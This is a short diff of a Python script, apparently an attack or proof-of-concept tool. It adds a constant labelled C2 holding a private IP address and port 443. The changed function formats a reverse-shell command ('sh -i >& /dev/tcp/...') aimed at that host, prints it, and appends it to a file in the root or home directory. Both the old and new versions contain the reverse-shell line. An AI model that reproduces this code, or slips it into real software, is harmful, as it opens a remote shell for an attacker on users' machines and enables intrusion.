@@ -22,15 +22,16 @@ ROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)
 USER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)
 USER = getpass.getuser()
 TIME = int(time.time())
+C2 = '192.168.249.128'
+PORT = 443
 
 
 def touch_file():
     try:
         with open(ROOT_PATH, 'a') as root_fd:
-            message = 'sh -i >& /dev/tcp/192.168.249.128/443 0>&1'.format(
-                ROOT_PATH,
-                USER,
-                TIME
+            message = 'sh -i >& /dev/tcp/{!r}/{!r} 0>&1'.format(
+                C2,
+                PORT
             )
             print(message)
             root_fd.write(message + '\n')
@@ -39,10 +40,9 @@ def touch_file():
     except (IOError, OSError):
         try:
             with open(USER_PATH, 'a') as user_fd:
-                message = 'sh -i >& /dev/tcp/192.168.249.128/443 0>&1'.format(
-                    USER_PATH,
-                    USER,
-                    TIME
+                message = 'sh -i >& /dev/tcp/{!r}/{!r} 0>&1'.format(
+                    C2,
+                    PORT
                 )
                 print(message)
                 user_fd.write(message + '\n')
